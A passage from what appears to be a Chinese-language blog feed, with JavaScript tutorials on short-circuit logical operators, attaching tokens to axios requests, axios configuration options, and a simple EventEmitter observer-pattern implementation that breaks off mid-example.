    
    
  </entry>
  
  <entry>
    <title>逻辑符号</title>
    <link href="https://github.com/TheNightElf/2017/12/26/%E9%80%BB%E8%BE%91%E7%AC%A6%E5%8F%B7/"/>
    <id>https://github.com/TheNightElf/2017/12/26/逻辑符号/</id>
    <published>2017-12-26T03:13:46.000Z</published>
    <updated>2017-12-26T03:43:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>说起逻辑符号，我们接触的最多的可能就是 <code>&amp;&amp;</code> 和 <code>||</code> 这两个比较符了。本节会介绍一下这两个逻辑运算符的 <code>短路操作</code> 规则以及使用逻辑运算符代替 <code>if</code> 的快速比较赋值操作。<br><a id="more"></a></p><h3 id="amp-amp-的短路运算规则"><a href="#amp-amp-的短路运算规则" class="headerlink" title="&amp;&amp; 的短路运算规则"></a>&amp;&amp; 的短路运算规则</h3><p>当 <code>&amp;&amp;</code> 逻辑比较前面的值为 <code>true</code> 时，则直接返回 <code>&amp;&amp;</code> 后面的值(不论该值为 <code>true</code> 还是 <code>false</code>)。<br>当 <code>&amp;&amp;</code> 逻辑比较前面的值为 <code>false</code> 时，则直接返回 <code>&amp;&amp;</code> 前面的值，不再关心后面的值。<br>下面是例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">5</span> &amp;&amp; <span class="number">6</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="comment">// =&gt; 6</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span> &amp;&amp; <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="comment">// =&gt; 0</span></span><br></pre></td></tr></table></figure><h3 id="的短路运算规则"><a href="#的短路运算规则" class="headerlink" title="|| 的短路运算规则"></a>|| 的短路运算规则</h3><p>当 <code>||</code> 逻辑比较前面的值为 <code>false</code> 时，则直接返回 <code>||</code> 后面的值(不论该值为 <code>true</code> 还是 <code>false</code>)。<br>当 <code>||</code> 逻辑比较前面的值为 <code>true</code> 时，则直接返回 <code>||</code> 前面的值，不再关心后面的值。<br>下面是例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0</span> || <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="comment">// =&gt; 1</span></span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span> || <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a)</span><br><span class="line"><span class="comment">// =&gt; 1</span></span><br></pre></td></tr></table></figure><h3 id="进阶用法"><a href="#进阶用法" class="headerlink" title="进阶用法"></a>进阶用法</h3><p>使用 <code>&amp;&amp;</code> 的短路规则代替短线 <code>if</code> 判断进行快速赋值操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span> (<span class="params">param</span>) </span>&#123;</span><br><span class="line">    !param &amp;&amp; (param = &#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span> (<span class="params">param</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!param) param = &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的写法 <code>1</code> 和 <code>2</code> 的实际效果完全相同。</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><h6 id="使用逻辑运算符代替短线-if-的优点"><a href="#使用逻辑运算符代替短线-if-的优点" class="headerlink" title="使用逻辑运算符代替短线 if 的优点:"></a>使用逻辑运算符代替短线 <code>if</code> 的优点:</h6><ol><li>运行速度快；<code>javascript</code> 中，逻辑运算符的执行速度是比 <code>if</code> 语句要快(参考短线操作规则)。</li><li>代码短小精悍，逼格更高(请忽略这点)。</li></ol><h6 id="使用逻辑运算符代替短线-if-的缺点"><a href="#使用逻辑运算符代替短线-if-的缺点" class="headerlink" title="使用逻辑运算符代替短线 if 的缺点:"></a>使用逻辑运算符代替短线 <code>if</code> 的缺点:</h6><ol><li>执行速度是变快了，但是使用的时候必须要注意 <code>操作符优先级</code> 的问题(可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_Precedence" target="_blank" rel="noopener">这里</a>)。</li><li>逼格是更高的，但是代码的可读性变的很差，不了解的人看了之后完全不知道怎么理解。</li></ol><p></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说起逻辑符号，我们接触的最多的可能就是 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; 和 &lt;code&gt;||&lt;/code&gt; 这两个比较符了。本节会介绍一下这两个逻辑运算符的 &lt;code&gt;短路操作&lt;/code&gt; 规则以及使用逻辑运算符代替 &lt;code&gt;if&lt;/code&gt; 的快速比较赋值操作。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Axios设置默认请求参数</title>
    <link href="https://github.com/TheNightElf/2017/12/17/axios%E8%AE%BE%E7%BD%AE%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0/"/>
    <id>https://github.com/TheNightElf/2017/12/17/axios设置默认参数/</id>
    <published>2017-12-17T02:15:40.000Z</published>
    <updated>2017-12-26T03:12:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>在网站建设成行对接 <code>api</code> 接口的时候经常会遇到一个场景——用户的登录验证。<br>大多数的做法都是服务端返回一个 <code>token</code> 给客户端，客户端存储在 <code>cookie</code> 或者 <code>Storage</code> 中。<br>等下次发请求的时候再将 <code>token</code> 携带，传递给服务端。但是这么做会非常的繁琐，每次都要在请求中设置 <code>token</code>。<br><a id="more"></a></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h4><p>使用 <code>axios</code> 官方提供的 <code>Interceptors</code> 拦截器进行配置。<br>假设 <code>token</code> 是储存在 <code>localeStorage</code> 中；<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求拦截器</span></span><br><span class="line">axios.interceptors.request.use(<span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> token = localStorage.getItem(<span class="string">'token'</span>)</span><br><span class="line">     <span class="comment">// 判断请求的类型</span></span><br><span class="line">     <span class="comment">// 如果是post请求就把默认参数拼到data里面</span></span><br><span class="line">     <span class="comment">// 如果是get请求就拼到params里面</span></span><br><span class="line">    <span class="keyword">if</span>(config.method === <span class="string">'post'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> data = qs.parse(config.data)</span><br><span class="line"></span><br><span class="line">        config.data = qs.stringify(&#123;</span><br><span class="line">            token: token,</span><br><span class="line">            ...data</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(config.method === <span class="string">'get'</span>) &#123;</span><br><span class="line">        config.params = &#123;</span><br><span class="line">            token: token,</span><br><span class="line">            ...config.params</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></p><p>拦截器会拦截所有的 <code>请求</code> 或者 <code>响应</code>，我们可以在拦截到请求的时候将用户的请求参数中添加 <code>token</code>。<br>这样就不需要每次都在请求中添加一次 <code>token</code> 的操作了。</p><p><strong>扩展</strong><br>响应拦截器可以拦截每一次服务端的响应信息，用户的 <code>登录超时</code> 完全可以在这个拦截器中处理。</p><h4 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h4><p>通过更改 <code>request config</code> 的默认配置实现。<br>在上文的介绍中，我们可以看到 <code>request config</code> 中有一项 <code>transformRequest</code> 的配置。该方法会在每个请求发送给服务端之前执行，我们来看下如何使用。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">axios.defaults.transformRequest = [<span class="function"><span class="keyword">function</span> (<span class="params">data, header</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> token = localStorage.getItem(<span class="string">'token'</span>)</span><br><span class="line">    <span class="comment">//header.post = &#123;</span></span><br><span class="line">      <span class="comment">//  "Content-Type": "application/json;charset=UTF-8"</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="keyword">var</span> obj = <span class="built_in">Object</span>.assign(&#123;&#125;, data, &#123; <span class="attr">token</span>: token &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(obj)</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure></p><p>使用这个方法的时候有几个需要注意的地方:</p><ol><li>该方法的返回值必须是 <code>string</code> 或 <code>Buffer实例</code> 或 <code>ArrayBuffer</code> 或 <code>FormData</code> 或 <code>Stream</code>。</li><li>转换完之后请求体的 <code>payload</code> 会变成 <code>FormData</code> 的形式，可以在 <code>header</code> 中重写 <code>Content-Type</code>。</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>Axios</code> 提供了非常灵活的配置方法供用户使用，我们不需要再自己封装一个类似的 <code>xhr</code> 方法。所有的用法官方都有详细的说明，如果你想了解更多，可以点击<a href="https://github.com/axios/axios">这里</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在网站建设成行对接 &lt;code&gt;api&lt;/code&gt; 接口的时候经常会遇到一个场景——用户的登录验证。&lt;br&gt;大多数的做法都是服务端返回一个 &lt;code&gt;token&lt;/code&gt; 给客户端，客户端存储在 &lt;code&gt;cookie&lt;/code&gt; 或者 &lt;code&gt;Storage&lt;/code&gt; 中。&lt;br&gt;等下次发请求的时候再将 &lt;code&gt;token&lt;/code&gt; 携带，传递给服务端。但是这么做会非常的繁琐，每次都要在请求中设置 &lt;code&gt;token&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Axios使用说明</title>
    <link href="https://github.com/TheNightElf/2017/12/13/Axios%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <id>https://github.com/TheNightElf/2017/12/13/Axios使用说明/</id>
    <published>2017-12-13T01:41:40.000Z</published>
    <updated>2017-12-13T02:13:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>Axios是近年来备受推崇的一个网络请求库，它以基于Promise的方式封装了浏览器的XMLHttpRequest和服务器端node http请求，使得我们可以用es6推荐的异步方式处理网络请求。<br><a id="more"></a></p><h3 id="为什么用Axios"><a href="#为什么用Axios" class="headerlink" title="为什么用Axios"></a>为什么用Axios</h3><blockquote><p>官方是这样介绍的：</p><ul><li>从浏览器创建XMLHttpRequest</li><li>从node.js创建http请求</li><li>支持Promise API</li><li>转换请求与响应数据</li><li>取消请求</li><li>自动转换JSON数据</li><li>支持客户端XSRF攻击防护</li></ul></blockquote><p>扩展了诸多功能之后 <code>axios.min.js</code> 文件最终打包出来大小仅有 <code>13kb</code>。</p><h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h3><p>官方给出了一份详尽的配置说明，供使用者自定义自己的使用方式。详情可以点击<a href="https://github.com/axios/axios">这里</a>。</p><h4 id="全局默认配置"><a href="#全局默认配置" class="headerlink" title="全局默认配置"></a>全局默认配置</h4><p><code>axios</code> 给出了3个全局的配置信息，如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">axios.defaults.baseURL = <span class="string">'https://api.example.com'</span>;</span><br><span class="line">axios.defaults.headers.common[<span class="string">'Authorization'</span>] = AUTH_TOKEN;</span><br><span class="line">axios.defaults.headers.post[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span>;</span><br></pre></td></tr></table></figure></p><p><strong>baseURL</strong><br>代表请求的地址，类似于 <code>host</code>。比如：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> baseUrl = <span class="string">'https://api.github.com'</span></span><br><span class="line">axios.defaults.baseURL = baseUrl;</span><br><span class="line">axios.get(<span class="string">'/user'</span>)</span><br><span class="line">    .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res)</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="comment">// ------------ 与上面的写法作用相同 --------------//</span></span><br><span class="line">axios.get(<span class="string">'https://api.github.com/user'</span>)</span><br><span class="line">    .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>通过配置 <code>baseUrl</code> 可以简化请求地址。</p><p><strong>Authorization</strong><br>授权信息，一般用于用户验证。如果没有设置，则请求是不会携带 <code>Authorization</code> 信息。</p><p><strong>Content-Type</strong><br>请求默认的 <code>Content-Type</code> 设置为 <code>application/x-www-form-urlencoded</code>，可以在全局更改，也可以在 <code>拦截器</code> 和 <code>请求/响应预处理</code> 中设置(后文中会细说)。</p><h4 id="请求默认配置"><a href="#请求默认配置" class="headerlink" title="请求默认配置"></a>请求默认配置</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  url: <span class="string">'/user'</span>,</span><br><span class="line"></span><br><span class="line">  method: <span class="string">'get'</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  baseURL: <span class="string">'https://some-domain.com/api/'</span>,</span><br><span class="line"></span><br><span class="line">  transformRequest: [<span class="function"><span class="keyword">function</span> (<span class="params">data, headers</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  transformResponse: [<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  headers: &#123;<span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>&#125;,</span><br><span class="line"></span><br><span class="line">  params: &#123;</span><br><span class="line">    ID: <span class="number">12345</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  paramsSerializer: <span class="function"><span class="keyword">function</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Qs.stringify(params, &#123;<span class="attr">arrayFormat</span>: <span class="string">'brackets'</span>&#125;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  data: &#123;</span><br><span class="line">    firstName: <span class="string">'Fred'</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  timeout: <span class="number">1000</span>,</span><br><span class="line"></span><br><span class="line">  withCredentials: <span class="literal">false</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  adapter: <span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  auth: &#123;</span><br><span class="line">    username: <span class="string">'janedoe'</span>,</span><br><span class="line">    password: <span class="string">'s00pers3cret'</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  responseType: <span class="string">'json'</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  xsrfCookieName: <span class="string">'XSRF-TOKEN'</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  xsrfHeaderName: <span class="string">'X-XSRF-TOKEN'</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  onUploadProgress: <span class="function"><span class="keyword">function</span> (<span class="params">progressEvent</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  onDownloadProgress: <span class="function"><span class="keyword">function</span> (<span class="params">progressEvent</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  maxContentLength: <span class="number">2000</span>,</span><br><span class="line"></span><br><span class="line">  validateStatus: <span class="function"><span class="keyword">function</span> (<span class="params">status</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> status &gt;= <span class="number">200</span> &amp;&amp; status &lt; <span class="number">300</span>; <span class="comment">// default</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  maxRedirects: <span class="number">5</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  httpAgent: <span class="keyword">new</span> http.Agent(&#123; <span class="attr">keepAlive</span>: <span class="literal">true</span> &#125;),</span><br><span class="line">  httpsAgent: <span class="keyword">new</span> https.Agent(&#123; <span class="attr">keepAlive</span>: <span class="literal">true</span> &#125;),</span><br><span class="line"></span><br><span class="line">  proxy: &#123;</span><br><span class="line">    host: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    port: <span class="number">9000</span>,</span><br><span class="line">    auth: &#123;</span><br><span class="line">      username: <span class="string">'mikeymike'</span>,</span><br><span class="line">      password: <span class="string">'rapunz3l'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  cancelToken: <span class="keyword">new</span> CancelToken(<span class="function"><span class="keyword">function</span> (<span class="params">cancel</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最常用的也就是前面的 <code>10</code> 个配置，而且意思都特别容易理解。<br>具体的用法可以参考<a href="https://github.com/axios/axios">官方说明</a>和<a href="https://github.com/axios/axios/tree/master/examples">examples</a>。</p><h4 id="返回体"><a href="#返回体" class="headerlink" title="返回体"></a>返回体</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  data: &#123;&#125;, <span class="comment">// 服务端对于请求返回的具体信息</span></span><br><span class="line"></span><br><span class="line">  status: <span class="number">200</span>,<span class="comment">// 服务端 http 的状态码</span></span><br><span class="line"></span><br><span class="line">  statusText: <span class="string">'OK'</span>, <span class="comment">// 服务端 http 文本的响应状态</span></span><br><span class="line"></span><br><span class="line">  headers: &#123;&#125;, <span class="comment">// 响应头部</span></span><br><span class="line"></span><br><span class="line">  config: &#123;&#125;, <span class="comment">// axios 请求时的配置信息</span></span><br><span class="line"></span><br><span class="line">  request: &#123;&#125; <span class="comment">// 请求的详细信息(XMLHttpRequest)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于内容实在太多，本文暂时就讲这么多。其它关于 <code>axios</code> 的方法的用法和说明都会在后文中讲解。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Axios是近年来备受推崇的一个网络请求库，它以基于Promise的方式封装了浏览器的XMLHttpRequest和服务器端node http请求，使得我们可以用es6推荐的异步方式处理网络请求。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>EventEmitter</title>
    <link href="https://github.com/TheNightElf/2017/12/12/EventEmitter/"/>
    <id>https://github.com/TheNightElf/2017/12/12/EventEmitter/</id>
    <published>2017-12-12T08:08:10.000Z</published>
    <updated>2017-12-13T03:12:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>自己编写一个简单的 <code>EventEmitter</code> 实现 <code>观察者模式</code>。</p><a id="more"></a><h3 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h3><blockquote><p>观察者模式面向的需求是：A对象（观察者）对B对象（被观察者）的某种变化高度敏感，需要在B变化的一瞬间做出反应。<br>举个例子，新闻里喜闻乐见的警察抓小偷，警察需要在小偷伸手作案的时候实施抓捕。<br>在这个例子里，警察是观察者、小偷是被观察者，警察需要时刻盯着小偷的一举一动，才能保证不会错过任何瞬间。<br>程序里的观察者和这种真正的【观察】略有不同，观察者不需要时刻盯着被观察者(例如A不需要每隔1ms就检查一次B的状态)；<br>二是采用注册(Register)或者成为订阅(Subscribe)的方式告诉被观察者：<br>我需要你的某某状态，你要在它变化时通知我。采取这样被动的观察方式，既省去了反复检索状态的资源消耗，也能够得到最高的反馈速度。</p></blockquote><h3 id="观察者模式的优缺点"><a href="#观察者模式的优缺点" class="headerlink" title="观察者模式的优缺点"></a>观察者模式的优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul><li>观察者模式在被观察者和观察者之间建立一个抽象的耦合。被观察者角色所知道的只是一个具体观察者列表，每一个具体观察者都符合一个抽象观察者的接口。被观察者并不认识任何一个具体观察者，它只知道它们都有一个共同的接口。</li><li>由于被观察者和观察者没有紧密地耦合在一起，因此它们可以属于不同的抽象化层次。如果被观察者和观察者都被扔到一起，那么这个对象必然跨越抽象化和具体化层次。</li><li>观察者模式支持广播通讯。被观察者会向所有的登记过的观察者发出通知。</li></ul><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul><li>如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。</li><li>如果在被观察者之间有循环依赖的话，被观察者会触发它们之间进行循环调用，导致系统崩溃。</li><li>如果对观察者的通知是通过另外的线程进行异步投递的话，系统必须保证投递是以自恰的方式进行的。</li><li>虽然观察者模式可以随时使观察者知道所观察的对象发生了变化，但是观察者模式没有相应的机制使观察者知道所观察的对象是怎么发生变化的。</li></ul><h3 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EventEmitter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.events = &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//绑定事件函数</span></span><br><span class="line">EventEmitter.prototype.on = <span class="function"><span class="keyword">function</span>(<span class="params">eventName, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.events[eventName] = <span class="keyword">this</span>.events[eventName] || [];</span><br><span class="line">    <span class="keyword">this</span>.events[eventName].push(callback); <span class="comment">// 1</span></span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">//触发事件函数</span></span><br><span class="line">EventEmitter.prototype.emit = <span class="function"><span class="keyword">function</span>(<span class="params">eventName, _</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> events = <span class="keyword">this</span>.events[eventName],</span><br><span class="line">    args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>), <span class="comment">// 2</span></span><br><span class="line">    i, m;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!events) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, m = events.length; i &lt; m; i++) &#123;</span><br><span class="line">        events[i].apply(<span class="literal">null</span>, args); <span class="comment">// 3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">// 删除事件函数</span></span><br><span class="line">EventEmitter.prototype.off = <span class="function"><span class="keyword">function</span> (<span class="params">eventName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">delete</span> <span class="keyword">this</span>.events[eventName]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上有3个注意点：<br>1.<code>EventEmitter</code> 接收事件时是以事件名作为 <code>key</code> 执行函数作为 <code>value:array</code>。<br>2.但用户触发 <code>emit</code> 时可以传递多个参数，所以将除 <code>事件名(arg[0])</code> 之外的参数视为传参，缓存供第 <code>3</code> 步时使用。<br>3.遍历事件的执行函数 <code>value</code> 并将 <code>args</code> 传递给每一个事件。</p><p>更多关于 <code>call</code> 和 <code>apply</code> 的介绍请参考<a href="https://developer.mozilla.org/en-US/" target="_blank" rel="noopener">这里</a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> Person = <span class="function"><span class="keyword">function</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype = <span class="keyword">new</span> EventEmitter()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person()</span><br><span class="line"></span><br><span class="line">p.on(<span class="string">'hello'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) 